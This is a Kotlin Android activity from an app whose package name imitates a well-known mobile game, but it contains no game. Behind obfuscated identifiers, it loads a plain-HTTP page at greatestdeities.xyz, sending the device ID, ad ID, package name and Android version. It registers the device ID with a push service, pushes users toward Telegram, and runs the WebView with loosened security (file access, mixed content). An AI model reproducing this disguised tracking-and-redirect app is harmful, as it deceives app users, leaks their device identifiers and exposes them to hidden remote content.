package com.kiloo.subwaysurfo

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.MediaStore
import android.webkit.*
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.snackbar.Snackbar
import com.kiloo.subwaysurfo.databinding.ActivityLeeeetsDoNotDoNotBinding
import com.onesignal.OneSignal
import com.orhanobut.hawk.Hawk
import org.json.JSONException
import org.json.JSONObject
import java.io.File
import java.io.IOException

class LeeeetsDoNotDoNotActivity : AppCompatActivity() {
    private val FILECHOOSERRESULTCODE = 1

    var tghyyhyhj: ValueCallback<Array<Uri>>? = null
    var hyjukiki: String? = null
    lateinit var thyhyju: WebView
    lateinit var bind: ActivityLeeeetsDoNotDoNotBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bind = ActivityLeeeetsDoNotDoNotBinding.inflate(layoutInflater)
        setContentView(bind.root)

        thyhyju = bind.viiiiiiiewWeb
        Snackbar.make(
            bind.root, "Loading...",
            Snackbar.LENGTH_LONG
        ).show()


        val cookieManagerfgtgyhy = CookieManager.getInstance()
        cookieManagerfgtgyhy.setAcceptCookie(true)
        cookieManagerfgtgyhy.setAcceptThirdPartyCookies(thyhyju, true)
        webSettingsdfgttgtgtt()
        val frgyhyactivity: Activity = this
        thyhyju.webViewClient = object : WebViewClient() {


            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                try {
                    if (URLUtil.isNetworkUrl(url)) {
                        return false
                    }
                    if (appInstalledOrNotedfrrr5rf(url)) {

                        val intentfgtt = Intent(Intent.ACTION_VIEW)
                        intentfgtt.data = Uri.parse(url)
                        startActivity(intentfgtt)
                    } else {

                        Toast.makeText(
                            applicationContext,
                            "Application is not installed",
                            Toast.LENGTH_LONG
                        ).show()
                        startActivity(
                            Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
                            )
                        )
                    }
                    return true
                } catch (e: Exception) {
                    return false
                }
                view.loadUrl(url)
            }


            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                //Save the last visited URL
                saveUrl(url)
            }

            override fun onReceivedError(
                view: WebView,
                errorCode: Int,
                description: String,
                failingUrl: String
            ) {
                Toast.makeText(frgyhyactivity, description, Toast.LENGTH_SHORT).show()
            }


        }
        thyhyju.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView, filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                tghyyhyhj?.onReceiveValue(null)
                tghyyhyhj = filePathCallback
                var rfgthyh: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                if (rfgthyh!!.resolveActivity(packageManager) != null) {

                    // create the file where the photo should go
                    var photoFilefrgtt: File? = null
                    try {
                        photoFilefrgtt = createImageFiledfrgtgt()
                        rfgthyh.putExtra("PhotoPath", hyjukiki)
                    } catch (ex: IOException) {
                        // Error occurred while creating the File
                    }

                    // continue only if the file was successfully created
                    if (photoFilefrgtt != null) {
                        hyjukiki = "file:" + photoFilefrgtt.absolutePath
                        rfgthyh.putExtra(
                            MediaStore.EXTRA_OUTPUT,
                            Uri.fromFile(photoFilefrgtt)
                        )
                    } else {
                        rfgthyh = null
                    }
                }
                val ctsefrtgt = Intent(Intent.ACTION_GET_CONTENT)
                ctsefrtgt.addCategory(Intent.CATEGORY_OPENABLE)
                ctsefrtgt.type = "image/*"
                val intentArrayfgtgt: Array<Intent?> =
                    rfgthyh?.let { arrayOf(it) } ?: arrayOfNulls(0)
                val edfrgthyhyIntent = Intent(Intent.ACTION_CHOOSER)
                edfrgthyhyIntent.putExtra(Intent.EXTRA_INTENT, ctsefrtgt)
                edfrgthyhyIntent.putExtra(Intent.EXTRA_TITLE, getString(R.string.dfgtimage_chooser))
                edfrgthyhyIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArrayfgtgt)
                startActivityForResult(
                    edfrgthyhyIntent, FILECHOOSERRESULTCODE
                )
                return true
            }


            @Throws(IOException::class)
            private fun createImageFiledfrgtgt(): File {
                var imageStorageDirfgtgt = File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    "DirectoryNameHere"
                )
                if (!imageStorageDirfgtgt.exists()) {
                    imageStorageDirfgtgt.mkdirs()
                }


                imageStorageDirfgtgt =
                    File(imageStorageDirfgtgt.toString() + File.separator + "IMG_" + System.currentTimeMillis() + ".jpg")
                return imageStorageDirfgtgt
            }

        }

        thyhyju.loadUrl(getUrldfrgtgt56())
    }


    private fun pushToOneSignalfgtefrg565d(string: String) {

        OneSignal.setExternalUserId(
            string,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(results: JSONObject) {
                    try {
                        if (results.has("push") && results.getJSONObject("push").has("success")) {
                            val edfrrfrff56e = results.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $edfrrfrff56e"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("email") && results.getJSONObject("email").has("success")) {
                            val frgtggtt =
                                results.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $frgtggtt"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                            val isSmsSuccessfgthyyh5f =
                                results.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $isSmsSuccessfgthyyh5f"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {
                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }



    private fun getUrldfrgtgt56(): String {

        val spoonfvrgt5t6g6t5 =
            getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)

        val packdfr5g6tgt = "com.kiloo.subwaysurfo"

        val myIdfrg65tt5: String? = Hawk.get(GooodClass.iiiiiiiiid, "null")
        val instanceIdfr6r5: String? = Hawk.get(GooodClass.innnnnnnnstid, "null")


        val twofr5r6gt6 = "deviceID="
        val threerfrrgt5 = "ad_id="
        val fourfrg6t55 = "sub_id_4="
        val fivefrgt5t = "sub_id_5="
        val sixfrgt55 = "sub_id_6="


        val firstdef65r = "http://"
        val secondde5fr5r5 = "greatestdeities.xyz/go.php?to=2&"

        val dfr4rr4f5namingI = "naming"


        val edfr45r4androidVersion = Build.VERSION.RELEASE

        val fr65rf5fr5 = firstdef65r + secondde5fr5r5

        val afterfrr55rrf =
            "$fr65rf5fr5$twofr5r6gt6$myIdfrg65tt5&$threerfrrgt5$instanceIdfr6r5&$fourfrg6t55$packdfr5g6tgt&$fivefrgt5t$edfr45r4androidVersion&$sixfrgt55$dfr4rr4f5namingI"

        pushToOneSignalfgtefrg565d(myIdfrg65tt5.toString())
        return spoonfvrgt5t6g6t5.getString("SAVED_URL", afterfrr55rrf).toString()
    }

    private fun webSettingsdfgttgtgtt() {
        val webSettings = thyhyju.settings
        webSettings.javaScriptEnabled = true

        webSettings.useWideViewPort = true

        webSettings.loadWithOverviewMode = true
        webSettings.allowFileAccess = true
        webSettings.domStorageEnabled = true
        webSettings.userAgentString = webSettings.userAgentString.replace("; wv", "")

        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.setSupportMultipleWindows(false)

        webSettings.displayZoomControls = false
        webSettings.builtInZoomControls = true
        webSettings.setSupportZoom(true)

        webSettings.pluginState = WebSettings.PluginState.ON
        webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        webSettings.setAppCacheEnabled(true)

        webSettings.allowContentAccess = true
    }


    private fun appInstalledOrNotedfrrr5rf(uri: String): Boolean {

        val pmfrfr5rf5 = packageManager
        try {

            pmfrfr5rf5.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)


            return true
        } catch (e: PackageManager.NameNotFoundException) {

        }
        return false
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode != FILECHOOSERRESULTCODE || tghyyhyhj == null) {
            super.onActivityResult(requestCode, resultCode, data)
            return
        }
        var resultsfrr5rf5rfr5: Array<Uri>? = null

        // check that the response is a good one
        if (resultCode == AppCompatActivity.RESULT_OK) {
            if (data == null || data.data == null) {
                // if there is not data, then we may have taken a photo
                resultsfrr5rf5rfr5 = arrayOf(Uri.parse(hyjukiki))
            } else {
                val dataString565ffffffff = data.dataString
                if (dataString565ffffffff != null) {
                    resultsfrr5rf5rfr5 = arrayOf(Uri.parse(dataString565ffffffff))
                }
            }
        }
        tghyyhyhj?.onReceiveValue(resultsfrr5rf5rfr5)
        tghyyhyhj = null
    }

    fun saveUrl(url: String?) {
        if (!url!!.contains("t.me")) {

            if (ffffffffffffirstUrl == "") {
                ffffffffffffirstUrl = getSharedPreferences(
                    "SP_WEBVIEW_PREFS",
                    AppCompatActivity.MODE_PRIVATE
                ).getString(
                    "SAVED_URL",
                    url
                ).toString()

                val ssssssssssp =
                    getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
                val eeeeeeeeditor = ssssssssssp.edit()
                eeeeeeeeditor.putString("SAVED_URL", url)
                eeeeeeeeditor.apply()
            }
        }
    }


    private var fffffffffffffff = false
    override fun onBackPressed() {


        if (thyhyju.canGoBack()) {
            if (fffffffffffffff) {
                thyhyju.stopLoading()
                thyhyju.loadUrl(ffffffffffffirstUrl)
            }
            this.fffffffffffffff = true
            thyhyju.goBack()
            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                fffffffffffffff = false
            }, 2000)

        } else {
            super.onBackPressed()
        }
    }

    var ffffffffffffirstUrl = ""

}